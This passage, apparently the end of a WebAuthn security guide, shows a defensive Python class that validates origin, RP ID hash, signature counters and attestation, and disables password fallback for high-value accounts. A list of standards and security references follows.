        return secrets.token_bytes(32)  # Minimum 16 bytes, 32 recommended

    def validate_origin(self, client_data, expected_origin):
        """Strictly validate origin"""
        if client_data['origin'] != expected_origin:
            raise SecurityException("Origin mismatch")
        if client_data.get('crossOrigin', False):
            raise SecurityException("Cross-origin not allowed")

    def validate_rp_id(self, rp_id_hash, expected_rp_id):
        """Validate RP ID hash matches expected value"""
        import hashlib
        expected_hash = hashlib.sha256(expected_rp_id.encode()).digest()
        if rp_id_hash != expected_hash:
            raise SecurityException("RP ID mismatch")

    def validate_counter(self, received_counter, stored_counter):
        """Counter MUST be greater than stored value"""
        if received_counter <= stored_counter:
            # Potential cloned authenticator!
            self.alert_security_team()
            raise SecurityException("Counter validation failed - possible clone")
        return received_counter

    def validate_attestation(self, attestation_object, required_aaguids=None):
        """Validate attestation if required"""
        if required_aaguids:
            # Only accept specific authenticators
            if attestation_object['authData']['aaguid'] not in required_aaguids:
                raise SecurityException("Authenticator not allowed")

    def disable_fallback_for_high_value(self, user):
        """High-value accounts should not have password fallback"""
        if user.security_level == 'high':
            user.password_auth_enabled = False
            user.recovery_options = ['admin_verification_only']
```

---

## References

- W3C WebAuthn Specification
- FIDO Alliance Security Reference
- OWASP WebAuthn Security Guidelines
- PortSwigger WebAuthn Research
- HackerOne/Bugcrowd WebAuthn Vulnerability Reports
- NIST SP 800-63B Digital Identity Guidelines
